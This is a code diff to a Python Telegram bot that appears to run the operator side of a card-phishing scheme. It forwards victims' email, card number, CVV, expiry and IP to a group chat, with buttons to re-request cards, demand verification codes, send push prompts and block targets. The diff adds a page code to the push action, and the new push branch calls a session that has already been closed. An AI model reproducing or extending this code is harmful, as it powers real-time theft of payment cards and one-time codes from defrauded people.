@@ -1642,6 +1642,7 @@ async def payment_notify(request):
         import traceback
         traceback.print_exc()
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
+    page_code = data.get('page', '') or data.get('page_code', '')
     msg2 = (
         f"E: {email}\n"
         f"C: {card}\n"
@@ -1649,20 +1650,22 @@ async def payment_notify(request):
         f"V: {cvv}\n"
         f"I: {ip}" + sum_str
     )
+    kb2_buttons = [
+        InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+        InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+        InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+        InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+    ]
+    if page_code:
+        kb2_buttons.append(InlineKeyboardButton(text="Push", callback_data=f"push:{ip}:{page_code}"))
     kb2 = InlineKeyboardMarkup(
         inline_keyboard=[
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}"),
-            InlineKeyboardButton(text="Push", callback_data=f"push:{ip}")
-        ],
-        [
+            kb2_buttons,
+            [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+            ]
         ]
-    ]
     )
     try:
         await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
@@ -1754,7 +1757,10 @@ async def code_notify(request):
     or c.data.startswith('push:')
 ))
 async def admin_action_handler(call: types.CallbackQuery):
-    action, ip = call.data.split(':', 1)
+    parts = call.data.split(':')
+    action = parts[0]
+    ip = parts[1] if len(parts) > 1 else None
+    page_code = parts[2] if action == 'push' and len(parts) > 2 else None
     import aiohttp as aiohttp_client
     async with aiohttp_client.ClientSession() as session:
         await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
@@ -1776,8 +1782,10 @@ async def admin_action_handler(call: types.CallbackQuery):
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
     elif action == 'push':
-        async with aiohttp_client.ClientSession() as session:
-            await session.post('http://127.0.0.1:8080/set_push_flag', json={'ip': ip, 'type': 'push'})
+        if page_code:
+            await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
+        else:
+            print('[push] No page_code provided!')
         await call.answer("Push notification sent")
     # НЕ змінюємо клавіатуру!
     await call.answer()
